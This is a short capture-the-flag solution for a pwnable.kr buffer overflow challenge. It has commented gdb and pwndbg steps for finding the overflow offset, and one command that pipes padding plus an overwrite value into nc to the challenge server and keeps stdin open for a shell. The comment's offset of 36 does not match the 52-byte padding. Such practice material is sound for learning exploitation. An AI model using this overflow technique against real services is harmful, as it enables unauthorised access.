# gdbscript = '''
# init-pwndbg
# continue
# info functions
# disassemble func
# break *func+40
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
# x/s $ebp+8
# cyclic -l naaa 
# '''.format(**locals()) 
#found offset at 36

(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca"; cat) | nc pwnable.kr 9000